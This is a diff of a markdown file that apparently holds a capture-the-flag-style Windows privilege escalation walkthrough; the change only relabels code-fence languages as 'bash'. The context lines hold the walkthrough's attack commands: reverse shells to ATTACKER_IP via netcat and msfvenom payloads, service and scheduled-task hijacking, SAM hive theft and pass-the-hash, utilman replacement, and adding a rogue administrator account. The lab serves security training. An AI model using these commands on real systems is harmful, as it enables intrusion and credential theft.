@@ -208,7 +208,7 @@ Privilege escalation is not always a challenge. Some misconfigurations can allow
  Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> schtasks /query /tn vulntask /fo list /v
 Folder: \
 HostName:                             THM-PC1
@@ -222,7 +222,7 @@ Run As User:                          taskusr1
  If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> icacls c:\tasks\schtask.bat
 c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
@@ -232,7 +232,7 @@ c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
    As can be seen in the result, the **BUILTIN\Users**  group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 ```
 
@@ -246,14 +246,14 @@ nc -lvp 4444
  The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> schtasks /run /tn vulntask
 ```
 
    And you will receive the reverse shell with taskusr1 privileges as expected:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.10.175.90 50649
@@ -275,7 +275,7 @@ wprivesc1\taskusr1
  This method requires two registry values to be set. You can query these from the command line using the commands below.
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
@@ -290,7 +290,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL
  As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
 
@@ -313,7 +313,7 @@ Windows Services Windows services are managed by the **Service Control Manager**
  To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc qc apphostsvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -348,7 +348,7 @@ SERVICE_NAME: apphostsvc
  To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
 
@@ -367,7 +367,7 @@ SERVICE_NAME: windowsscheduler
    We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                   NT AUTHORITY\SYSTEM:(I)(F)
@@ -384,7 +384,7 @@ Successfully processed 1 files; Failed processing 0 files
  Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 
 user@attackerpc$ python3 -m http.server
@@ -394,14 +394,14 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    We can then pull the payload from Powershell with the following command:
 
     Powershell  
-```Powershell 
+```bash
 wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 ```
 
    Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> cd C:\PROGRA~2\SYSTEM~1\
 
 C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
@@ -417,14 +417,14 @@ C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
    We start a reverse listener on our attacker machine:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4445
 ```
 
    And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc stop windowsscheduler
 C:\> sc start windowsscheduler
 ```
@@ -434,7 +434,7 @@ C:\> sc start windowsscheduler
 As a result, you'll get a reverse shell with svcusr1 privileges:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4445
 Listening on 0.0.0.0 4445
 Connection received on 10.10.175.90 50649
@@ -456,7 +456,7 @@ wprivesc1\svcusr1
  As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc qc "vncserver"
 [SC] QueryServiceConfig SUCCESS
 
@@ -476,7 +476,7 @@ SERVICE_NAME: vncserver
 Now let's look at another service without proper quotation:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc qc "disk sorter enterprise"
 [SC] QueryServiceConfig SUCCESS
 
@@ -512,7 +512,7 @@ SERVICE_NAME: disk sorter enterprise
  In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. We can check this using `icacls`:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\>icacls c:\MyPrograms
 c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
               BUILTIN\Administrators:(I)(OI)(CI)(F)
@@ -529,7 +529,7 @@ Successfully processed 1 files; Failed processing 0 files
  The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
 
 user@attackerpc$ nc -lvp 4446
@@ -538,7 +538,7 @@ user@attackerpc$ nc -lvp 4446
    Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
 
 C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
@@ -548,7 +548,7 @@ C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
    Once the service gets restarted, your payload should execute:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc stop "disk sorter enterprise"
 C:\> sc start "disk sorter enterprise"
 ```
@@ -556,7 +556,7 @@ C:\> sc start "disk sorter enterprise"
    As a result, you'll get a reverse shell with svcusr2 privileges:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4446
 Listening on 0.0.0.0 4446
 Connection received on 10.10.175.90 50650
@@ -576,7 +576,7 @@ wprivesc1\svcusr2
  To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\tools\AccessChk> accesschk64.exe -qlc thmservice
   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
         SERVICE_QUERY_STATUS
@@ -597,7 +597,7 @@ C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
 
 user@attackerpc$ nc -lvp 4447
@@ -606,21 +606,21 @@ user@attackerpc$ nc -lvp 4447
    We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
 ```
 
    To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
 ```
 
    Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> sc stop THMService
 C:\> sc start THMService
 ```
@@ -628,7 +628,7 @@ C:\> sc start THMService
    And we will receive a shell back in our attacker's machine with SYSTEM privileges:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4447
 Listening on 0.0.0.0 4447
 Connection received on 10.10.175.90 50650
@@ -697,7 +697,7 @@ whoami /priv
  Once on the command prompt, we can check our privileges with the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -715,7 +715,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
    To backup the SAM and SYSTEM hashes, we can use the following commands:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> reg save hklm\system C:\Users\THMBackup\system.hive
 The operation completed successfully.
 
@@ -726,7 +726,7 @@ The operation completed successfully.
    This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ mkdir share
 user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
 ```
@@ -734,7 +734,7 @@ user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -use
    This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
 C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
 ```
@@ -742,7 +742,7 @@ C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
    And use impacket to retrieve the users' password hashes:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
 
@@ -755,7 +755,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
 
@@ -790,7 +790,7 @@ nt authority\system
  Once on the command prompt, we can check our privileges with the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -812,7 +812,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
  To replace utilman, we will start by taking ownership of it with the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> takeown /f C:\Windows\System32\Utilman.exe
 
 SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
@@ -821,7 +821,7 @@ SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by us
    Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
 processed file: Utilman.exe
 Successfully processed 1 files; Failed processing 0 files
@@ -830,7 +830,7 @@ Successfully processed 1 files; Failed processing 0 files
    After this, we will replace utilman.exe with a copy of cmd.exe:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\Windows\System32\> copy cmd.exe utilman.exe
         1 file(s) copied.
 ```
@@ -888,7 +888,7 @@ C:\Windows\System32\> copy cmd.exe utilman.exe
  Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4442
 ```
 
@@ -908,7 +908,7 @@ c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKE
  If all was correctly set up, you should expect a shell with SYSTEM privileges:
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@attackerpc$ nc -lvp 4442
 Listening on 0.0.0.0 4442
 Connection received on 10.10.175.90 49755
@@ -1008,7 +1008,7 @@ net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
  This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user `pwnd` exists and is part of the administrators' group:
 
     Command Prompt  
-```Command Prompt 
+```bash
 PS C:\> net user pwnd
 User name                    pwnd
 Full Name
@@ -1046,7 +1046,7 @@ Several scripts exist to conduct system enumeration in ways similar to the ones 
  WinPEAS WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> winpeas.exe > outputfile.txt
 ```
 
@@ -1061,7 +1061,7 @@ C:\> winpeas.exe > outputfile.txt
 **Reminder** : To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.
 
     Powershell  
-```Powershell 
+```bash
 PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
 PS C:\> . .\PrivescCheck.ps1
 PS C:\> Invoke-PrivescCheck
@@ -1080,7 +1080,7 @@ PS C:\> Invoke-PrivescCheck
  Once this is done, wes.py can be run as follows;
 
     Kali Linux  
-```Kali Linux 
+```bash
 user@kali$ wes.py systeminfo.txt
 ```
 
